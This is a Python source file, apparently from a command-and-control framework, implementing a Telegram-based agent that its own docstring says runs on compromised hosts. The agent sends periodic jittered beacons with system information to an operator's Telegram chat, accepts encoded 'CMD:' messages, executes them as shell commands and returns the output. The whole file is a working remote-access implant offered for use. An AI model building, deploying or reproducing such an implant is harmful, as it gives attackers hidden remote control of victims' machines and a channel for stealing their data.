# c2_frameworks/telegram/agent.py
"""
Telegram C2 Agent
Runs on compromised hosts – beacons to your Telegram bot
Receives commands, executes them, returns output
"""

import asyncio
import base64
import json
import os
import time
from datetime import datetime

from telegram import Update
from telegram.ext import Application, ContextTypes, MessageHandler, filters

from .utils import (
    generate_session_id,
    encode_payload,
    decode_payload,
    execute_command,
    build_beacon_payload
)


class TelegramC2Agent:
    def __init__(self, bot_token: str, chat_id: str, beacon_interval: int = 60):
        self.bot_token = bot_token
        self.chat_id = int(chat_id)
        self.beacon_interval = beacon_interval
        self.session_id = generate_session_id()
        self.last_task_id = None
        
        # Build application
        self.app = Application.builder().token(bot_token).build()
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_command))
        
        print(f"[+] Telegram C2 Agent Started")
        print(f"[+] Session ID : {self.session_id}")
        print(f"[+] Chat ID    : {self.chat_id}")
        print(f"[+] Beacon     : Every {beacon_interval}s")

    async def send_message(self, text: str):
        """Send text message to C2 chat"""
        try:
            await self.app.bot.send_message(chat_id=self.chat_id, text=text, disable_web_page_preview=True)
        except Exception as e:
            print(f"[-] Failed to send message: {e}")

    async def send_beacon(self):
        """Send periodic beacon with system info"""
        payload = build_beacon_payload(self.session_id)
        encoded = encode_payload(payload)
        await self.send_message(f"ONLINE:{encoded}")

    async def handle_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle incoming command from operator"""
        if update.message.chat_id != self.chat_id:
            return  # Ignore wrong chat

        text = update.message.text.strip()
        
        if text.startswith("CMD:"):
            try:
                encoded = text[4:]
                data = decode_payload(encoded)
                task_id = data.get("task_id")
                command = data.get("command")

                print(f"[*] Received task {task_id}: {command}")

                # Execute command
                output = execute_command(command)

                # Send result back
                result_payload = {
                    "type": "result",
                    "task_id": task_id,
                    "session_id": self.session_id,
                    "output": output,
                    "timestamp": datetime.utcnow().isoformat() + "Z"
                }
                result_encoded = encode_payload(result_payload)
                await self.send_message(f"RESULT:{result_encoded}")
                print(f"[+] Result sent for task {task_id}")

            except Exception as e:
                await self.send_message(f"ERROR: Failed to process command: {e}")

    async def beacon_loop(self):
        """Main loop – send beacon periodically"""
        while True:
            try:
                await self.send_beacon()
                await asyncio.sleep(self.beacon_interval + random.uniform(-15, 15))  # Jitter
            except Exception as e:
                print(f"[-] Beacon error: {e}")
                await asyncio.sleep(60)

    def run(self):
        """Start the agent"""
        loop = asyncio.get_event_loop()
        loop.create_task(self.beacon_loop())
        self.app.run_polling()


# ——— Entry Point ———
if __name__ == "__main__":
    import argparse
    import random

    parser = argparse.ArgumentParser(description="Telegram C2 Agent")
    parser.add_argument("--token", required=True, help="Bot token")
    parser.add_argument("--chat-id", required=True, help="Your chat ID")
    parser.add_argument("--interval", type=int, default=60, help="Beacon interval")
    
    args = parser.parse_args()
    
    agent = TelegramC2Agent(args.token, args.chat_id, args.interval)
    agent.run()